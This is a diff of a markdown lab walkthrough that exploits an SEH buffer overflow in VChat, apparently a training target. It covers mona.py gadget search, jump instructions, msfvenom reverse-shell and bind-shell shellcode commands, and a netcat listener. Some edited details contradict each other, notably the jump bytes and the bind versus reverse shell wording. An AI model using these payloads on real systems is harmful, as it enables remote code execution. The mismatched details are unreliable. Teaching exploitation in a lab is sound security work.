@@ -250,22 +250,18 @@ I do feel it is a bit hard to identify which string actually crashes VChat. It a
 	```
 	* This will return an offset as shown below. In this case, the offset is `3571`.
 
-	<img src="Images/I10.png" width=600>
-
 4. Now we can modify the exploit program to reflect the program [exploit2.py](./SourceCode/exploit2.py), and run the resulting exploit against VChat. If this is successful, we will have the SEH Record overflow and modify the handler's pointer to a series of `B`s. This allows us to crash the program when the overflow occurs and see if the register contains all `B`s; as that tells us we have successfully aligned our overflow.
    * We do this to validate that we have the correct offset for the SEH record!
+   * See that the SEH handler is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program when an exception occurs.
+   * Note: Sometimes, it took a few runs for this to work and update on the Immunity debugger.
 
-		<img src="Images/I11.png" width=600>
-
-		* See that the SEH handler is a series of the value `42` that is a series of Bs. This tells us that we can write an address to that location in order to change the control flow of the program when an exception occurs.
-		* Note: Sometimes, it took a few runs for this to work and update on the Immunity debugger.
 5. Now let's pass the exception to the program and see what happens, we can use the keybind `Shift+F7` to do this (This should be displayed at the bottom of the screen).
 
-	<img src="Images/I12.png" width=600>
+	<img src="Images/exploit1-exception-ESP.png" width=600>
 
-      * We can see that the `ESP` register (Containing the stack pointer) holds the address of `00F4EDC8`; however, our buffer starts at `00F4EDD0`, which means we need to traverse 8-bytes before we reach a segment of the stack we control. *Remember* this is a 32-bit program!
+      * We can see that the `ESP` register (Containing the stack pointer) holds the address of `00BCED88`; however, an address related to our buffer is stored as `00BCED90`, which means we need to traverse 8-bytes before we reach a segment of the stack we control. *Remember* this is a 32-bit program!
 
-6. We can use the fact that our extra data is on the stack to our advantage and `pop` the extra data off into some register. The exact register does not matter, as we simply want to remove extra data from the stack. We can use `mona.py` to find an SEH gadget that pops the two extra elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing the code we will inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
+6. We can use the fact that the extra 8 bytes is on the stack to our advantage and `pop` the extra data off into some register. The exact register does not matter, as we simply want to remove extra data from the stack. We can use `mona.py` to find a gadget that pops the two extra elements off the stack (8-bytes), which places the stack pointer `ESP` in the correct position for us to start executing the code we will inject into our buffer; Use the command `!mona seh -cp nonull -cm safeseh=off -o` in Immunity Debugger as shown below.
 
 	<img src="Images/I13.png" width=600>
 
@@ -274,44 +270,35 @@ I do feel it is a bit hard to identify which string actually crashes VChat. It a
       * The `-cp nonull -cm safeseh=off` flag tells *mona.py* to ignore safeseh modules (The program was not compiled for safe SEH).
       * The `-o` flag tells *mona.py* to ignore OS modules.
 
-	<img src="Images/I14.png" width=600>
+	<img src="Images/exploit1-gadget.png" width=600>
 
-      * We can see there are quite several options; any one of them should work. For the examples, we will use the address `62501B5E`.
+      * We can see there are quite several options; any one of them should work. For the examples, we will use the address `6250271B`.
 	  * *Note*: If you do not see any output it may be hidden behind the one of the Immunity Debugger windows, you can open the `log` view.
 
 7. Modify the exploit to reflect the [exploit3.py](./SourceCode/exploit3.py) script to verify that this SEH overwrite works. We do this to ensure that the SEH gadget is called and we have removed the two elements from the stack. This allows us to continue the exploitation process.
    1. Click on the black button highlighted below, and enter the address we decided in the previous step.
 
-		<img src="Images/I16.png" width=600>
+		<img src="Images/exploit1-gadget-breakpoint.png" width=600>
 
    2. Set a breakpoint at the desired address (right-click).
 
-		<img src="Images/I17.png" width=600>
+		<img src="Images/exploit1-gadget-set-breakpoint.png" width=600>
 
    3. Run the [exploit3.py](./SourceCode/exploit3.py) program till an overflow occurs (See SEH record change).
-
-		<img src="Images/I18.png" width=600>
-
          * Notice that the SEH record's handler now points to an essfunc.dll address!
-	4. Once the overflow occurs pass the exception using `Shift+F7` then click the *step into* button!
 
-		<img src="Images/I19a.png" width=600>
+   4. Once the overflow occurs pass the exception using `Shift+F7` then click the *step into* button!
+   
+		<img src="Images/exploit1-broken.png" width=600>
 
-         * This is what we will see **before** the exception is passed.
+   5. Notice that we jumped to the stack that we just overflowed!
 
-		<img src="Images/I19b.png" width=600>
 
-         * This is what we will see once we have passed the exception, as we will have hit the breakpoint!
+8. Notice where we have jumped to? This is slightly off as we jumped to the address stored in the first half of the SEH record! 
 
-	5. Notice that we jumped to the stack that we just overflowed!
+	<img src="Images/exploit1-jumped-2-stack.png" width=600>
 
-		<img src="Images/I20.png" width=600>
-
-8. Notice where we have jumped to? This is slightly off as we jumped to the address stored in the first half of the SEH record!
-
-	<img src="Images/I21.png" width=600>
-
-   * This means we have `00AEFFFF - 00AEFFCC = 33` or a decimal value of 51 bytes of space. This is much less than the `3503` before our SEH overwrite...
+   * The available space is really not much. 
 
 9. Now, we want to perform a Short Jump to avoid overwriting the SEH block. A short jump instruction is only 2 bytes and should give us enough space to perform a long jump to the start of the buffer. We should use the tool `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` to generate the machine code for this.
    * Run `nasm_shell.rb`. *Note* that it's path may differ on different machines!
@@ -321,84 +308,58 @@ I do feel it is a bit hard to identify which string actually crashes VChat. It a
 
 10. Copy the output from the `nasm_shell.rb` (`EB08`) into the [exploit4.py](./SourceCode/exploit4.py) exploit script. We will use the NOP instructions to overwrite the SEH handler's address. This allows us to differentiate it from the `A`s, however this could simple be replaced with `A`s as it does not affect the result of our exploit. This exploit file allows us to verify up to the short jump!
 <!--(Makes it stand out?)-->
+
 11. Run the program with a breakpoint set and observe its outcome. We should be able to see the Short Jump!
 
-	<img src="Images/I23.png" width=600>
-
-12. Now we can, as was done in the [GTER exploit](https://github.com/DaintyJet/VulserverAttacks/tree/main/03-GTER_ReusingSocketStack), perform a long jump to the start of the buffer! In this case the address of the starting point is `00DDF221` (This may vary!), and we can use this when providing Immunity Debugger an instruction to assemble so it can calculate the offset for us.
+12. Now we can, as was done in the [GTER exploit](https://github.com/DaintyJet/VulserverAttacks/tree/main/03-GTER_ReusingSocketStack), perform a long jump to the start of the buffer! In this case the address of the starting point is `00BDF1DD` (This may vary!), and we can use this when providing Immunity Debugger an instruction to assemble so it can calculate the offset for us.
 
    1. Select the address we performed the short jumped to and right click it, select the assemble option as shown below.
 
-	   <img src="Images/I24.png" width=600>
+	   <img src="Images/exploit1-assemble-long-jmp.png" width=600>
 
    2. Assemble the instruction and copy the result's hex value so we can insert it into our exploit code!
-
-	   <img src="Images/I25.png" width=600>
-
-      * In this case the assembled instruction was `E9 46 F2 FF FF` Which will become `\xe9\x46\xf2\xff\xff`.
+      * In this case the assembled instruction was `E9 46 F2 FF FF` Which will become `\xe9\x02\xf2\xff\xff`.
    3. After inserting the instruction and pressing "step into", we should see ourselves at the start of the buffer.
-
-	   <img src="Images/I26.png" width=600>
 
 13. Modify the [exploit5.py](./SourceCode/exploit5.py) exploit script to have your new long `jmp` instruction, set a breakpoint at the `pop/pop/ret` SEH gadget and observe its behavior! We want to ensure we jump to the start of the buffer we have overflown.
 
    1. Observe the exploit hitting the `pop/pop/ret` gadget after passing the exception to the program.
-
-	   <img src="Images/I27.png" width=600>
-
    2. Observe the program hitting the short jump instruction.
-
-      <img src="Images/I28.png" width=600>
-
    3. Observe the program hitting the long jump instruction.
-
-      <img src="Images/I29.png" width=600>
 
 Now that we have all the necessary parts for the creation of an exploit, we will add the shellcode to our payload and gain access to a reverse shell!
 
 ### Exploitation
 Up until this point in time,  we have been performing [Denial of Service](https://attack.mitre.org/techniques/T0814/) (DoS) attacks. Since we simply overflowed the stack with what is effectively garbage address values (a series of `A`s, `B`s, and `C`s), all we have done with our exploits is crash the VChat server directly or indirectly after our jump instructions lead to an invalid operation. Now, we have all the information necessary to control the flow of VChat's execution, allowing us to inject [Shellcode](https://www.sentinelone.com/blog/malicious-input-how-hackers-use-shellcode/) and perform a more meaningful attack.
 
-1. Now, we will need to create a reverse shell we can include in the payload. This is a program that reaches out and makes a connection to the attacker's machine (or one they control) from the target machine and provides a shell to the attacker. We can generate the shellcode with the following command.
+1. We create a bind shell. This is a program that listens for connections on the target machine and provides a shell to anyone that makes a tcp connection to the port it is listening on. We can generate the shellcode with the following command.
+	```sh
+	$ msfvenom -p windows/shell_bind_tcp RPORT=4444 EXITFUNC=thread -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
 	```
-	$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=seh -f python -v SHELL -a x86 --platform windows -b '\x00\x0a\x0d'
-	```
-      * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
-	  * `-p `: Payload we are generating shellcode for.
-    	* `windows/shell_reverse_tcp`: Reverse TCP payload for Windows.
-    	* `LHOST=10.0.2.7`: The remote listening host's IP, in this case our Kali machine's IP `10.0.2.7`.
-    	* `LPORT=8080`: The port on the remote listening host's traffic should be directed to in this case port 8080.
-    	* `EXITFUNC=thread`: Create a thread to run the payload.
-	  * `-f`: The output format.
-      	* `python`: Format for use in python scripts.
-  	  * `-v`: Specify a custom variable name.
-    	* `SHELL`: Shell Variable name.
-      * `-a x86`: Specify the target architecture as `x86`
-	  * `--platform windows`: Specify the target platform as Windows
-  	  * `-b`: Specifies bad chars and byte values. This is given in the byte values.
-        * `\x00\x0a\x0d`: Null char, carriage return, and newline.
+   * `msfvenom`: [Metasploit](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) payload encoder and generator.
+   * `-p windows/shell_bind_tcp`: Specify we are using the tcp bind shell payload for windows.
+     * `RPORT=4444`: Specify the Receiving (Remote) port is 4444.
+     * `EXITFUNC=thread`: Exit process, this is running as a thread.
+     * `-f`: The output format.
+       * `python`: Format for use in python scripts.
+     * `-v`: Specify a custom variable name.
+     * `SHELL`: Shell Variable name.
+     * `-a x86`: Specify the target architecture as `x86`
+     * `--platform windows`: Specify the target platform as Windows
+     * `-b`: Specifies bad chars and byte values. This is given in the byte values.
+       * `\x00\x0a\x0d`: Null char, carriage return, and newline.
+
 
 2. Create the byte array representing the shellcode as done in [exploit6.py](./SourceCode/exploit6.py). Remember this should be placed at the start of the buffer! Now we are in the final stage. If all previous steps have succeeded then placing this shellcode at the start of the buffer should enabled us to get arbitrary code execution.
 3. Now, let's see how the program reacts!
    1. Observe the exploit hitting the `pop/pop/ret` gadget after passing the exception to the program.
-
-	   <img src="Images/I27.png" width=600>
-
    2. Observe the program hitting the short jump instruction.
-
-      <img src="Images/I28.png" width=600>
-
    3. Observe the program hitting the long jump instruction.
-
-      <img src="Images/I30.png" width=600>
-
-	4. Observe that we are not at the start of the shell code!
-
-      <img src="Images/I31.png" width=600>
+   4. Observe that we are not at the start of the shell code!
 
 4. Now run netcat and use the reverse shell: `nc -lv -p 4444`.
 
-      <img src="Images/I32.png" width=600>
+      <img src="Images/exploit1-exploit.png" width=600>
 
 
 ## Attack Mitigation Table
